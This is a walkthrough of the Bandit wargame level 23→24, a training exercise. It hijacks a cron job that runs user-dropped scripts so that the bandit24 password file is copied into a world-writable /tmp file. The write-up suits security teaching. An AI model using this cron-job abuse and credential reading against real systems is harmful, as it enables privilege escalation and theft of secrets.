# Bandit Level 23 → Level 24

> A cron job runs every minute as `bandit24`. It executes and deletes scripts placed in `/var/spool/bandit24/foo/` if they are regular files owned by `bandit23`.

## Steps

1. **Inspect the Cron Configuration:** Run `cat /etc/cron.d/cronjob_bandit24` to identify the script executed every minute as `bandit24`.
2. **Analyze the Cron Script:** Run `cat /usr/bin/cronjob_bandit24.sh` to understand its behavior:
   - Changes to `/var/spool/bandit24/foo/`.
   - Iterates through the directory entries.
   - Checks whether each entry is a regular file owned by `bandit23`.
   - Executes matching files with a 60-second timeout.
   - Deletes each entry after processing.
3. **Prepare the Output File:** Create the output file and make it writable by all users:
   ```bash
   touch /tmp/bandit24_pass
   chmod 666 /tmp/bandit24_pass
   ```
4. **Create a Shell Script:** Create `/var/spool/bandit24/foo/bandit23.sh` with the following content:
   ```bash
   #!/bin/bash
   cat /etc/bandit_pass/bandit24 >> /tmp/bandit24_pass
   ```
5. **Set Execution Permissions:** Run `chmod 755 /var/spool/bandit24/foo/bandit23.sh` to make the script executable.
6. **Wait for Cron Execution:** The cron job executes the script as `bandit24`, allowing it to read the protected password file and append its contents to `/tmp/bandit24_pass`. The submitted script is deleted after processing.
7. **Retrieve the Password:** Run `cat /tmp/bandit24_pass` to obtain the password for Level 24.
